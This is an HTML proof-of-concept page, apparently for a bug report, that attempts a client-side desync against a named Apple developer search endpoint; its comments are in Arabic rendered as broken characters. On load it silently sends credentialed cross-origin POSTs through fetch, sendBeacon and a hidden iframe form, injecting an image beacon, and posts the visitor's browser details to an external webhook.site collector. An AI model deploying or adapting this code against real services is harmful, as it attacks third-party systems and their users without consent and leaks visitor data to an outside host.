<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Apple Developer Client-Side Desync PoC</title>
  <meta name="referrer" content="no-referrer" />
  <style>
    body { font-family: system-ui, Arial, sans-serif; margin: 24px; line-height: 1.3; }
    h1 { margin: 0 0 8px; }
    code, pre { background:#f6f8fa; padding:8px 10px; border-radius:6px; display:block; }
    .ok{color:#0a0}
    .warn{color:#a60}
    .err{color:#b00}
    .muted{opacity:.75}
  </style>
</head>
<body>
  <h1>Apple Developer Client-Side Desync PoC</h1>
  <p>This page sends a crafted request to the target endpoint and attempts a CSP bypass beacon. We use multiple cross-origin techniques so the request is <em>sent</em> even if the response is not readable due to CORS.</p>
  <p class="muted">Target: <code id="tg"></code></p>
  <pre id="log">Running PoCâ€¦</pre>

  <!-- Ø·Ø±ÙŠÙ‚Ø© 3: Ù†Ù…ÙˆØ°Ø¬ POST Ø¥Ù„Ù‰ iFrame Ù…Ø®ÙÙŠ (Ø§Ù„Ø£Ø¶Ù…Ù† Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨) -->
  <iframe name="sink" style="display:none;"></iframe>
  <form id="pocForm" target="sink" method="POST">
    <input type="hidden" name="payload" id="payloadInput" value="">
  </form>

  <script>
    // === Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ===
    const WEBHOOK = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
    const TARGET  = "https://developer.apple.com/search/services/v1/quick-links/"; // endpoint Ø§Ù„Ù…ØµØ§Ø¨
    document.getElementById("tg").textContent = TARGET;

    // Ø­Ù…ÙˆÙ„Ø© Ø¨ÙŠÙƒÙˆÙ† Ø¨Ø³ÙŠØ·Ø©: <img> Ø³ÙŠØ¤Ø¯ÙŠ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹ Ø¥Ù„Ù‰ hit Ø¹Ù„Ù‰ Ø§Ù„Ù€ Webhook Ø¥Ø°Ø§ Ø¹ÙØ±Ø¶Øª ÙƒÙ€ HTML Ù„Ø¯Ù‰ Ø§Ù„Ø¶Ø­ÙŠØ©
    const beaconHTML = `<img src="${WEBHOOK}?poc=apple_test" alt="x">`;

    // Ø£Ø¯ÙˆØ§Øª Ø¹Ø±Ø¶
    function log(msg, cls="") {
      const el = document.getElementById("log");
      el.innerHTML += `\n${cls ? '' : ''}${msg}`;
      console[cls==="err" ? "error" : "log"](msg);
    }

    // Ø®Ø·ÙˆØ© A: fetch no-cors (Ù‚Ø¯ ÙŠØ±ÙØ¶Ù‡Ø§ Ø§Ù„Ù…ØªØµÙØ­/Ø§Ù„Ø³ÙŠØ±ÙØ± â€” Ù‡ÙŠ Ù…Ø­Ø§ÙˆÙ„Ø© Ø£ÙˆÙ„Ù‰ ÙÙ‚Ø·)
    async function tryFetchNoCors() {
      try {
        await fetch(TARGET, {
          method: "POST",
          mode: "no-cors", // ÙŠØ±Ø³Ù„ Ø§Ù„Ø·Ù„Ø¨ Ù„ÙƒÙ† Ù„Ù† Ù†Ù‚Ø±Ø£ Ø§Ù„Ø±Ø¯
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: "payload=" + encodeURIComponent(beaconHTML),
          credentials: "include"
        });
        log("âœ… fetch(no-cors) sent (response is opaque due to CORS).", "ok");
        return true;
      } catch (e) {
        log("âš ï¸ fetch(no-cors) failed: " + e, "warn");
        return false;
      }
    }

    // Ø®Ø·ÙˆØ© B: sendBeacon (Ù„Ø§ ÙŠÙ‚Ø±Ø£ Ø§Ù„Ø±Ø¯ØŒ Ù„ÙƒÙ†Ù‡ ÙŠØ±Ø³Ù„ POST Ù…ÙˆØ«ÙˆÙ‚ ØºØ§Ù„Ø¨Ø§Ù‹)
    function trySendBeacon() {
      try {
        const ok = navigator.sendBeacon(TARGET, `payload=${encodeURIComponent(beaconHTML)}`);
        if (ok) {
          log("âœ… navigator.sendBeacon sent.", "ok");
          return true;
        } else {
          log("âš ï¸ navigator.sendBeacon returned false (browser declined).", "warn");
          return false;
        }
      } catch (e) {
        log("âš ï¸ navigator.sendBeacon failed: " + e, "warn");
        return false;
      }
    }

    // Ø®Ø·ÙˆØ© C: form POST Ø¥Ù„Ù‰ iframe Ù…Ø®ÙÙŠ (cross-origin submit â€” Ù„Ø§ ÙŠØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ CORS Ù„Ù„Ù‚Ø±Ø§Ø¡Ø©)
    function submitHiddenForm() {
      try {
        const form = document.getElementById("pocForm");
        const input = document.getElementById("payloadInput");
        form.action = TARGET;
        input.value = beaconHTML;
        form.submit();
        log("âœ… Hidden <form> POST submitted to target (in hidden iframe).", "ok");
        return true;
      } catch (e) {
        log("âŒ Hidden <form> submit failed: " + e, "err");
        return false;
      }
    }

    // Proof marker Ø¥Ù„Ù‰ Webhook (ØºÙŠØ± Ø­Ø³Ø§Ø³)
    function sendProof() {
      const proof = {
        target: TARGET,
        proof: "Apple Unified PoC",
        when: new Date().toISOString(),
        ua: navigator.userAgent,
        page: location.href
      };
      fetch(WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(proof)
      });
      log("ğŸ“¤ Proof beacon sent to webhook (non-sensitive).", "ok");
    }

    (async function run() {
      log("PoC initialized. Preparing cross-origin sendsâ€¦");
      sendProof();

      const a = await tryFetchNoCors();
      const b = trySendBeacon();
      const c = submitHiddenForm();

      if (!a && !b && !c) {
        log("âŒ All send attempts failed in this browser. Try another browser/profile.", "err");
      } else {
        log("â„¹ï¸ Check your Webhook for beacons when/if the payload is reflected or served from cache.", "warn");
      }
      log("Done.");
    })();
  </script>
</body>
</html>
